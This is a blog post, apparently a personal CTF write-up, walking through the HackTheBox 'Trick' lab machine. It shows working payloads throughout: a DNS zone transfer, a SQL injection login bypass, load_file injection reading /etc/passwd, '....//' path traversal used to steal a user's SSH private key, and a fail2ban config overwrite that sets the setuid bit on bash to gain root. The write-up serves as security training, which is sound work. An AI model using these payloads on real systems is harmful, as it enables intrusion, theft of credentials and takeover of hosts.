@@ -1,0 +1,175 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=theme-color content="#494f5c"><meta name=msapplication-TileColor content="#494f5c"><meta itemprop=name content="HackTheBox - Trick"><meta itemprop=description content="Premise Trick is machine challenge that presents itself initially as an incomplete website - from there we need to perform various types of enumeration, avoid rabbitholes, and use some classic vulnerabilities to get our flags!
+Recon If we hit the challenge&rsquo;s IP directly we get a totally non-functional website. There are initial references to a bootstrap form url (just https://startbootstrap/<stuff here>) however this will go nowhere - this is just poor documentation on the bootstrap side I think, as it should have ."><meta itemprop=datePublished content="2022-09-11T00:00:00+00:00"><meta itemprop=dateModified content="2022-09-11T00:00:00+00:00"><meta itemprop=wordCount content="1785"><meta itemprop=keywords content="ctf,"><meta property="og:title" content="HackTheBox - Trick"><meta property="og:description" content="Premise Trick is machine challenge that presents itself initially as an incomplete website - from there we need to perform various types of enumeration, avoid rabbitholes, and use some classic vulnerabilities to get our flags!
+Recon If we hit the challenge&rsquo;s IP directly we get a totally non-functional website. There are initial references to a bootstrap form url (just https://startbootstrap/<stuff here>) however this will go nowhere - this is just poor documentation on the bootstrap side I think, as it should have ."><meta property="og:type" content="article"><meta property="og:url" content="https://www.maclaren.dev/posts/2022-09/htb_trick/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-09-11T00:00:00+00:00"><meta property="article:modified_time" content="2022-09-11T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="HackTheBox - Trick"><meta name=twitter:description content="Premise Trick is machine challenge that presents itself initially as an incomplete website - from there we need to perform various types of enumeration, avoid rabbitholes, and use some classic vulnerabilities to get our flags!
+Recon If we hit the challenge&rsquo;s IP directly we get a totally non-functional website. There are initial references to a bootstrap form url (just https://startbootstrap/<stuff here>) however this will go nowhere - this is just poor documentation on the bootstrap side I think, as it should have ."><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><title>HackTheBox - Trick</title><link rel=stylesheet href=https://www.maclaren.dev/css/style.min.037b6ee8f8c1baab6a3d0a9da11c3ff18a7552471f16c59fd98538d5ce99208b.css integrity="sha256-A3tu6PjBuqtqPQqdoRw/8Yp1UkcfFsWf2YU41c6ZIIs=" crossorigin=anonymous></head><body id=page><header id=site-header class="animated slideInUp"><div class="hdr-wrapper section-inner"><div class=hdr-left><div class=site-branding><a href=https://www.maclaren.dev>Logan MacLaren</a></div><nav class="site-nav hide-in-mobile"><a href=https://www.maclaren.dev/posts/>Blog</a></nav></div><div class="hdr-right hdr-icons"><button id=toc-btn class="hdr-btn desktop-only-ib" title="Table of Contents"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-list"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3" y2="6"/><line x1="3" y1="12" x2="3" y2="12"/><line x1="3" y1="18" x2="3" y2="18"/></svg></button><span class="hdr-social hide-in-mobile"><a href=https://www.linkedin.com/in/loganmaclaren/ target=_blank rel="noopener me" title=Linkedin><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a><a href=https://github.com/maclarel target=_blank rel="noopener me" title=Github><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://infosec.exchange/@gill3tt3 target=_blank rel="noopener me" title=Mastodon><svg xmlns="http://www.w3.org/2000/svg" class="feather feather-link" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg></a></span><button id=menu-btn class=hdr-btn title=Menu><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></header><div id=mobile-menu class="animated fast"><ul><li><a href=https://www.maclaren.dev/posts/>Blog</a></li></ul></div><main class="site-main section-inner animated fadeIn faster"><article class=thin><header class=post-header><div class=post-meta><span>Sep 11, 2022</span></div><h1>HackTheBox - Trick</h1></header><div class=content><h1 id=premise>Premise<a href=#premise class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p><code>Trick</code> is machine challenge that presents itself initially as an incomplete website - from there we need to perform various types of enumeration, avoid rabbitholes, and use some classic vulnerabilities to get our flags!</p><h1 id=recon>Recon<a href=#recon class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>If we hit the challenge&rsquo;s IP directly we get a totally non-functional website. There are initial references to a bootstrap form url (just <code>https://startbootstrap/&lt;stuff here></code>) however this will go nowhere - this is just poor documentation on the bootstrap side I think, as it should have <code>.com</code> on the end. Nothing else to see here, and fuzzing the IP for other endpoints/subdirs will go nowhere. The only other basic enumeration that we get from here is that we&rsquo;re accessing an Nginx 1.14.2 server - this will be helpful information later.</p><p>A quick <code>nmap</code> scan will show us that TCP 22, 25, 53, and 80 are open - SSH, SMTP, DNS, and HTTP respectively. What stands out here is that we&rsquo;ve got a DNS server running - right away I&rsquo;m thinking we can use that to find out other hostnames for the machine. Let&rsquo;s do a reverse lookup:</p><pre><code>dig -x $target @$target
+
+; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; -x 10.129.66.216 @10.129.66.216
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 32934
+;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;216.66.129.10.in-addr.arpa.    IN      PTR
+
+;; ANSWER SECTION:
+216.66.129.10.in-addr.arpa. 604800 IN   PTR     trick.htb.
+
+;; AUTHORITY SECTION:
+66.129.10.in-addr.arpa. 604800  IN      NS      trick.htb.
+
+;; ADDITIONAL SECTION:
+trick.htb.              604800  IN      A       127.0.0.1
+trick.htb.              604800  IN      AAAA    ::1
+
+;; Query time: 24 msec
+;; SERVER: 10.129.66.216#53(10.129.66.216)
+;; WHEN: Sun Sep 11 06:12:05 EDT 2022
+;; MSG SIZE  rcvd: 136
+</code></pre><p>Ok, we have an initial domain! Let&rsquo;s plug it into <code>/etc/hosts</code> and&mldr; Oh, that&rsquo;s not useful for much, it&rsquo;s the same content.</p><p>What if we try a zone transfer attack to see what else the nameserver handles?</p><pre><code>dig axfr @$target trick.htb
+
+; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; axfr @10.129.54.230 trick.htb
+; (1 server found)
+;; global options: +cmd
+trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+trick.htb.              604800  IN      NS      trick.htb.
+trick.htb.              604800  IN      A       127.0.0.1
+trick.htb.              604800  IN      AAAA    ::1
+preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
+trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+;; Query time: 19 msec
+;; SERVER: 10.129.54.230#53(10.129.54.230)
+;; WHEN: Sat Sep 10 21:38:37 EDT 2022
+;; XFR size: 6 records (messages 1, bytes 203)
+</code></pre><p>That&rsquo;s more like it! After updating <code>/etc/hosts</code> to include <code>preprod-paywall.trick.htb</code> we&rsquo;ve got a new website being served up.</p><h1 id=lovely-filter-inclusions>Lovely Filter Inclusions<a href=#lovely-filter-inclusions class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>Once we get to the Payroll site, we are met with a login page that we don&rsquo;t have credentials for. Fortunately it&rsquo;s vulnerable to some basic SQLi - a username of <code>admin' or 1=1; --</code> will get us right in,</p><p>Poking around from here for SSTI or other possible PHP vulns doesn&rsquo;t get too far, however XSS/HTML injection is possible in a few places, including the <code>Name</code> field on the <code>Users</code> tab of this interface. I spent a good 2 hours here before finally giving up on it&mldr; it turns out this was a complete rabbithole. RFI/RCE is not possible here, and anything you can dump via XSS on it is basically useless.</p><p>Where we do get some traction here is in the other tabs - one of interest is the <code>Employee</code> tab where we see this as the main content:</p><pre><code>  &lt;script type=&quot;text/javascript&quot;&gt;
+    $(document).ready(function(){
+
+      
+
+      
+      $('.edit_employee').click(function(){
+        var $id=$(this).attr('data-id');
+        uni_modal(&quot;Edit Employee&quot;,&quot;manage_employee.php?id=&quot;+$id)
+        
+      });
+      $('.view_employee').click(function(){
+        var $id=$(this).attr('data-id');
+        uni_modal(&quot;Employee Details&quot;,&quot;view_employee.php?id=&quot;+$id,&quot;mid-large&quot;)
+        
+      });
+      $('#new_emp_btn').click(function(){
+        uni_modal(&quot;New Employee&quot;,&quot;manage_employee.php&quot;)
+      })
+      $('.remove_employee').click(function(){
+        _conf(&quot;Are you sure to delete this employee?&quot;,&quot;remove_employee&quot;,[$(this).attr('data-id')])
+      })
+    });
+    function remove_employee(id){
+      start_load()
+      $.ajax({
+        url:'ajax.php?action=delete_employee',
+        method:&quot;POST&quot;,
+        data:{id:id},
+        error:err=&gt;console.log(err),
+        success:function(resp){
+            if(resp == 1){
+              alert_toast(&quot;Employee's data successfully deleted&quot;,&quot;success&quot;);
+                setTimeout(function(){
+                location.reload();
+
+              },1000)
+            }
+          }
+      })
+    }`
+</code></pre><p>At face value this just shows that the page will open some modals/pop-ups, which it does when we click on certain buttons, but the real interest here is that <code>+$id</code> parameter that&rsquo;s being added on&mldr; Smells like a SQLi opportunity.</p><p>Sure enough, after fuzzing it with a few payloads, we can do a union select with it.</p><pre><code>http://preprod-payroll.trick.htb/manage_employee.php?id=1%20union%20select%201,2,3,4,5,6,7,8
+</code></pre><p>This doesn&rsquo;t give us anything, but since we know it&rsquo;s vulnerable we can move on to more fun <a href=https://infosecwriteups.com/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2>like using it for LFI/RFI</a>:</p><pre><code>http://preprod-payroll.trick.htb/manage_employee.php?id=1%20union%20select%201,2,load_file(%27/etc/passwd%27),4,5,6,7,8
+</code></pre><p>And look at that, we&rsquo;ve replaced one of the parts of data returned with the <code>/etc/passwd</code> file:</p><pre><code>root❌0:0:root:/root:/bin/bashdaemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologinbin❌2:2:bin:/bin:/usr/sbin/nologinsys❌3:3:sys:/dev:/usr/sbin/nologinsync❌4:65534:sync:/bin:/bin/syncgames❌5:60:games:/usr/games:/usr/sbin/nologinman❌6:12:man:/var/cache/man:/usr/sbin/nologinlp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail❌8:8:mail:/var/mail:/usr/sbin/nologinnews❌9:9:news:/var/spool/news:/usr/sbin/nologinuucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy❌13:13:proxy:/bin:/usr/sbin/nologinwww-data❌33:33:www-data:/var/www:/usr/sbin/nologinbackup❌34:34:backup:/var/backups:/usr/sbin/nologinlist❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt❌100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync❌101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network❌102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve❌103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus❌104:110::/nonexistent:/usr/sbin/nologintss❌105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/falsednsmasq❌106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinusbmux❌107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinrtkit❌108:114:RealtimeKit,,,:/proc:/usr/sbin/nologinpulse❌109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologinspeech-dispatcher❌110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/falseavahi❌111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologinsaned❌112:121::/var/lib/saned:/usr/sbin/nologincolord❌113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologingeoclue❌114:123::/var/lib/geoclue:/usr/sbin/nologinhplip❌115:7:HPLIP system user,,,:/var/run/hplip:/bin/falseDebian-gdm❌116:124:Gnome Display Manager:/var/lib/gdm3:/bin/falsesystemd-coredump❌999:999:systemd Core Dumper:/:/usr/sbin/nologinmysql❌117:125:MySQL Server,,,:/nonexistent:/bin/falsesshd❌118:65534::/run/sshd:/usr/sbin/nologinpostfix❌119:126::/var/spool/postfix:/usr/sbin/nologinbind❌120:128::/var/cache/bind:/usr/sbin/nologinmichael❌1001:1001::/home/michael:/bin/bash
+</code></pre><p>Let&rsquo;s save this for later, but the key thing of interest here is that we can pull <em>some</em> content from the local filesystem.</p><p>At this point I slammed my head against the wall trying to do further enumeration for another hour or so, and eventually took a look at the HTB Forum thread on this. Unfortunately, this spoiled things a bit for me (I was able to guess the other hostname based on <code>pre****-mar******</code> being in a comment), but I went back after to do some more digging on it!</p><h1 id=enabled-and-available>Enabled and Available<a href=#enabled-and-available class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>Earlier I mentioned that the server responses confirmed we&rsquo;re running Nginx. This means we <em>likely</em> have a few static file locations we can look at. Since we have RFI here, let&rsquo;s try pulling some.</p><p>We can get the nginx <code>access.log</code> file - <code>view-source:http://preprod-payroll.trick.htb/manage_employee.php?id=1%20union%20select%201,2,load_file(%27/var/log/nginx/access.log%27),4,5,6,7,8</code>. This could actually provide you with some good content on a shared box, but I&rsquo;m on a VIP instance so I can only see my own traffic - you might get one of the other hostnames leaked here if not using VIP which would be a nice win and honestly a good &ldquo;real world&rdquo; example of how this could work.</p><p>Another file we can look at for enumeration is <code>/etc/nginx/sites-available/default</code>:</p><pre><code>server {
+  listen 80 default_server;
+  listen [::]:80 default_server;
+  server_name trick.htb;
+  root /var/www/html;
+
+  index index.html index.htm index.nginx-debian.html;
+
+  server_name _;
+
+  location / {
+    try_files $uri $uri/ =404;
+  }
+
+  location ~ \.php$ {
+    include snippets/fastcgi-php.conf;
+    fastcgi_pass unix:/run/php/php7.3-fpm.sock;
+  }
+}
+
+
+server {
+  listen 80;
+  listen [::]:80;
+
+  server_name preprod-marketing.trick.htb;
+
+  root /var/www/market;
+  index index.php;
+
+  location / {
+    try_files $uri $uri/ =404;
+  }
+
+        location ~ \.php$ {
+                include snippets/fastcgi-php.conf;
+                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
+        }
+}
+
+server {
+        listen 80;
+        listen [::]:80;
+
+        server_name preprod-payroll.trick.htb;
+
+        root /var/www/payroll;
+        index index.php;
+
+        location / {
+                try_files $uri $uri/ =404;
+        }
+
+        location ~ \.php$ {
+                include snippets/fastcgi-php.conf;
+                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
+        }
+}
+</code></pre><p>Well look at that, we have another hostname that wasn&rsquo;t there in the zone transfer - <code>preprod-marketing.trick.htb</code>. Let&rsquo;s add that to the ol' <code>/etc/hosts</code> file and move over to it.</p><h1 id=the-classics>The classics<a href=#the-classics class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>Marketing&rsquo;s website is where this becomes a bit more basic, thankfully, as the enumeration up to this point has been more difficult than I had expected given the challenge&rsquo;s rating.</p><p>The main thing to take note of on the marketing page is that the page seems to be running off of PHP <code>incloude</code>s, whereas the payroll site was using nav anchors to load content. This means we can <em>probably</em> use some basic path traversal, though it may need to get somewhat obfuscated as many challenges (and of course real world scenarios) will filter this either with application code or a WAF):</p><p><code>http://preprod-marketing.trick.htb/index.php?page=about.html</code> isn&rsquo;t of any use to us, but what about <code>http://preprod-marketing.trick.htb/index.php?page=../../../../../../etc/passwd</code>? Well, no, sadly. Maybe if we tweak that a bit further?</p><p><code>http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//etc/passwd</code>:</p><pre><code>root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt❌100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync❌101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network❌102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve❌103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus❌104:110::/nonexistent:/usr/sbin/nologin tss❌105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasq❌106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux❌107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit❌108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse❌109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher❌110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi❌111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned❌112:121::/var/lib/saned:/usr/sbin/nologin colord❌113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue❌114:123::/var/lib/geoclue:/usr/sbin/nologin hplip❌115:7:HPLIP system user,,,:/var/run/hplip:/bin/false Debian-gdm❌116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false systemd-coredump❌999:999:systemd Core Dumper:/:/usr/sbin/nologin mysql❌117:125:MySQL Server,,,:/nonexistent:/bin/false sshd❌118:65534::/run/sshd:/usr/sbin/nologin postfix❌119:126::/var/spool/postfix:/usr/sbin/nologin bind❌120:128::/var/cache/bind:/usr/sbin/nologin michael❌1001:1001::/home/michael:/bin/bash
+</code></pre><p>That looks familiar, but, ugh, we could already get this with the SQLi from earlier&mldr; maybe we&rsquo;re running as a different user for this site? We can&rsquo;t get <code>/etc/shadow</code> so we&rsquo;re probably not <code>root</code>, but maybe we&rsquo;re the <code>michael</code> user (or someone with access to their home)? They seem to be the only user on the box&mldr;</p><p>One <code>GET</code> to <code>http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//home/michael/user.txt</code> and we have our first flag! Woohoo!</p><h1 id=get-a-grip-or-a-foothold>Get a grip (or a foothold)<a href=#get-a-grip-or-a-foothold class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>Next step, let&rsquo;s get on this box. Fortunately <code>michael</code> is kind enough to have his private key in its default location, and it can be used for ssh:</p><pre><code>$ curl -o id_rsa http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa
+$ chmod 0600 id_rsa
+$ ssh -i id_rsa michael@trick.htb
+Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+michael@trick:~$
+</code></pre><h1 id=do-you-prefer-taking-the-elevator-or-the-escalator>Do you prefer taking the elevator or the escalator?<a href=#do-you-prefer-taking-the-elevator-or-the-escalator class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>Now that we&rsquo;ve got reliable access we can try to get <code>root</code> access. We can start out by <a href=https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS>running <code>linpeas</code> to see if we have anything interesting</a>.</p><p>One thing that pops up a lot in the output here is that we&rsquo;ve running <code>fail2ban</code> (non-default, which is why it stands out) and _the <code>/etc/fail2ban/action.d</code> directory is writeable for our current user. The other thing that makes this really stand out as either a deliberate rabbithole, or our path to root, is that we also happen to have the ability to restart the <code>fail2ban</code> service as our <em>only</em> <code>NOPASSWD</code> <code>sudo</code> privilege:</p><pre><code> (root) NOPASSWD: /etc/init.d/fail2ban restart
+</code></pre><p><code>fail2ban</code> is a great application in that it can be used to block IPs via iptables, or perform <em>other arbitrary actions</em> when a given scenario is hit. A simple example is that if we multiple SSH failures are detected from an IP, <code>fail2ban</code> will block access from that IP via <code>iptables</code> for a set period of time.</p><p>In this challenge, the situation above is exactly how it works, and it&rsquo;s set for a period of 10 seconds. Sure enough, it&rsquo;s also running as <code>root</code> so we can do whatever we want with this service as long as we can modify the config:</p><pre><code>michael@trick:/dev/shm$ ps aux |grep fail2ban
+root        729  0.0  1.0 248664 20580 ?        Ssl  12:10   0:01 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
+</code></pre><p>One quick overwrite of <code>/etc/fail2ban/action.d/iptables-multiport.conf</code> to ironically change <code>actionban</code> from blocking our IP to making <code>/bin/bash</code> a <code>setuid</code> variable with <code>chmod +s /bin/bash</code>, a restart of <code>fail2ban</code>, and after a few failed SSH attempts with a junk password:</p><pre><code>michael@trick:/etc/fail2ban/action.d$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+
+michael@trick:/etc/fail2ban/action.d$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+
+michael@trick:/etc/fail2ban/action.d$ /bin/bash -p
+bash-5.0# whoami
+root
+</code></pre><p>Note: Updating <code>/bin/bash</code> to have the <code>setuid</code> bit is just one of many possible solutions here. A reverse shell, other permission changes, etc&mldr; are all equally valid solutions.</p><p>GG!</p></div><hr class=post-end><footer class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://www.maclaren.dev/tags/ctf>ctf</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>1785 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>2022-09-11 00:00 +0000</p></footer></article><aside id=toc><div class=toc-title>Table of Contents</div><nav id=TableOfContents></nav></aside><div class="post-nav thin"><a class=next-post href=https://www.maclaren.dev/posts/2022-10/thm_rootme/><span class=post-nav-label><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>&nbsp;Newer</span><br><span>TryHackMe - Root Me</span></a>
+<a class=prev-post href=https://www.maclaren.dev/posts/2022-09/bell_udm/><span class=post-nav-label>Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg></span><br><span>Bell HomeHub 4000 + Ubiquiti Unifi Dream Machine VPN</span></a></div><div id=comments class=thin></div></main><footer id=site-footer class="section-inner thin animated fadeIn faster"><p>&copy; 2022 <a href=https://www.maclaren.dev>Logan MacLaren</a> &#183; <a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>CC BY-NC 4.0</a> &#183; <a rel=me href=https://infosec.exchange/@gill3tt3>Mastodon</a></p><p>Made with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> &#183; Theme <a href=https://github.com/Track3/hermit target=_blank rel=noopener>Hermit</a> &#183; <a href=https://www.maclaren.dev/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 